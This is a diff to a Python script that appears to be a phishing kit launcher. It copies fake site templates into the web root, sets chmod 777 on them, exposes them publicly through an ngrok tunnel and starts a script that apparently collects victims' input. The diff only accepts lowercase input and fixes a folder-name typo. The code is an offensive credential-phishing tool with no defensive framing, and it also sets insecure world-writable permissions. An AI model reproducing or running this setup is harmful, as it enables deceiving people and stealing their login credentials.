@@ -22,7 +22,7 @@ input = raw_input
 
 yn = input ('\x1b[1;31;40m' +'do you want to Start (N)o To stop  , or (Y)es To start our project : ''\x1b[0m')
 os.system("clear")
-if yn =="Y":
+if yn =="Y" or yn=="y":
    print ('\x1b[1;37;40m' +'''
                                                                                                       
 MMMMMMMM               MMMMMMMM                            FFFFFFFFFFFFFFFFFFFFFFDDDDDDDDDDDDD        
@@ -142,7 +142,7 @@ elif stphish =="9":
     os.system("chmod 777 /var/www/html/*")
     os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
 elif stphish =="10":
-    os.system("cp -a sites/orgin/. /var/www/html/ ")
+    os.system("cp -a sites/origin/. /var/www/html/ ")
     os.system("chmod 777 /var/www/html/")
     os.system("chmod 777 /var/www/html/*")
     os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
